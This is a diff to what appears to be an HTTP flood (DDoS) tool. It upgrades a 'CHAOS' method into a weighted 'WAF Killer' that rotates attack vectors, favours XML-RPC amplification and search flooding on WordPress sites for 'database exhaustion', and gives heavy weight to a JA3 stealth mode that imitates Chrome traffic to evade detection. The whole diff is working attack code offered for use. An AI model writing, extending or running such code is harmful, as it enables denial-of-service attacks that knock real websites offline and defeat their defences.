@@ -2523,16 +2523,42 @@ class HttpFlood(Thread):
 
 
     def CHAOS(self):
-        """[V8] Multi-Vector Attack - Randomly rotates between multiple attack methods
-        each iteration, making WAF pattern detection extremely difficult."""
-        chaos_pool = [self.GET, self.POST, self.STRESS, self.PPS, self.DYN, self.POST_DYN]
+        """[V9] Advanced Adaptive Multi-Vector Attack (WAF Killer)
+        Dynamically adjusts probability of attack methods based on heuristic scanning."""
+        
+        # Base vector pool with weighted probabilities (method, weight)
+        chaos_pool = [
+            (self.GET, 10), 
+            (self.POST, 15), 
+            (self.STRESS, 10), 
+            (self.PPS, 5), 
+            (self.DYN, 15), 
+            (self.POST_DYN, 20)
+        ]
+        
+        # Inject highly-lethal CMS vectors if detected
         if hasattr(self, 'crawled_paths') and self.crawled_paths:
             path_str = ' '.join(self.crawled_paths).lower()
             if 'wp-' in path_str or 'wordpress' in path_str:
-                chaos_pool.extend([self.XMLRPC_AMP, self.WP_SEARCH])
+                # Prioritize database exhaustion if WP is detected
+                chaos_pool.extend([(self.XMLRPC_AMP, 45), (self.WP_SEARCH, 50)])
+                
+        # Inject Stealth Cryptographic bypassing if installed
         if HAS_TLS_CLIENT:
-            chaos_pool.append(self.STEALTH_JA3)
-        chosen = randchoice(chaos_pool)
+            # Huge weight because this mimics organic Chrome traffic perfectly
+            chaos_pool.append((self.STEALTH_JA3, 60))
+            
+        # Select method based on weighted probability
+        total_weight = sum(weight for _, weight in chaos_pool)
+        r = randint(1, total_weight)
+        
+        upto = 0
+        for method, weight in chaos_pool:
+            if upto + weight >= r:
+                chosen = method
+                break
+            upto += weight
+            
         chosen()
 
 
